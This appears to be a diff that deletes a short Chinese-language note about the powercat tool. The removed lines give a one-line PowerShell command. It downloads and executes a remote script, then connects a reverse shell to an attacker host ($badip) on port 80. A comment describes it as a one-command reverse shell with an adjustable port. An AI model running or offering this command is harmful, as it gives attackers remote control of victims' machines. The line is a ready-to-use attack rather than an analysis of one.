@@ -1,6 +1,0 @@
-官方地址：https://github.com/besimorhino/powercat/blob/master/powercat.ps1
-cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('$downloadurl');powercat -c $badip -p 80 -e powershell
-
-###
-一条命令反弹shell，端口自己改，默认80
-###
